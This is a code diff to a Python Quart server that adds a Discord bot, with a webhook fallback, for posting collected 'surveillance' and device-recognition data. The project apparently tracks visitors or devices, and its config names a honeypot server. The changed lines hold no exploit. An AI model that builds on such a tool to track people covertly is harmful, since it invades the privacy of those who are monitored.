@@ -23,6 +23,7 @@ from json_handler import read_json_file, get_env_vars
 from surveillance_embeds import create_combined_surveillance_embed, get_threat_indicator
 from device_tracker import get_tracker
 from quart import Quart, jsonify, redirect, render_template, request, send_file
+from bot_manager import get_bot_manager, initialize_bot
 
 app = Quart(__name__)
 l = Logger(console_log=True, file_logging=True, file_URI="logs/log1.txt", override=True)
@@ -927,11 +928,16 @@ def send_advanced_data_to_discord(
             except Exception as e:
                 l.error(f"Error during device recognition: {e}")
 
-        # Create comprehensive combined embed with all data
-        embed = create_combined_surveillance_embed(data, recognition_info)
-
-        # Send embed without buttons since webhooks don't support interactive components
-        send_to_channel(COMPREHENSIVE_REPORT_MESSAGE, embed)
+        # Try to send via bot first (supports interactive buttons)
+        bot_manager = get_bot_manager()
+        if bot_manager and bot_manager.ready:
+            l.info("Sending data via Discord bot with interactive menu")
+            bot_manager.send_data(data, recognition_info)
+        else:
+            # Fallback to webhook if bot not available
+            l.warning("Bot not available, falling back to webhook")
+            embed = create_combined_surveillance_embed(data, recognition_info)
+            send_to_channel(COMPREHENSIVE_REPORT_MESSAGE, embed)
 
     except Exception as e:
         l.error(f"Error sending advanced data to Discord: {e}")
@@ -1220,5 +1226,19 @@ if __name__ == "__main__":
     alternative_server_url = config["honeypot_server"]
 
     app_port = int(config["app_port"])
+
+    # Initialize Discord bot if bot token is provided
+    bot_token = config.get("discord_bot_token")
+    if bot_token:
+        l.info("Discord bot token found, initializing bot...")
+        try:
+            initialize_bot(bot_token)
+            l.passing("Discord bot initialized successfully")
+        except Exception as e:
+            l.error(f"Failed to initialize Discord bot: {e}")
+            l.warning("Continuing with webhook-only mode")
+    else:
+        l.warning("No Discord bot token found in config, using webhook-only mode")
+        l.info("Add 'discord_bot_token' to config to enable interactive bot features")
 
     app.run(host="0.0.0.0", port=app_port)
